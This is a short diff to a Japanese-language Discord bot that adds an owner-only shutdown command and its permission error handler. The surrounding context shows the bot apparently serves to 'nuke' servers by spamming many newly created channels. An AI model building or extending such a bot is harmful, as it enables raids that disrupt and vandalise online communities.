@@ -121,5 +121,17 @@ async def hrvx(ctx):
 
     await asyncio.gather(*(spam(ch) for ch in new_channels))
     print(" nukeログ")
+    
+@bot.command()
+@commands.is_owner()
+async def stop(ctx):
+    await ctx.send("Botを停止します。")
+    await bot.close()
 
+# エラーハンドリング（権限がないときのメッセージ例）
+@stop.error
+async def stop_error(ctx, error):
+    if isinstance(error, commands.NotOwner):
+        await ctx.send("このコマンドを実行できるのはボットの所有者だけです。")
+        
 bot.run(TOKEN)
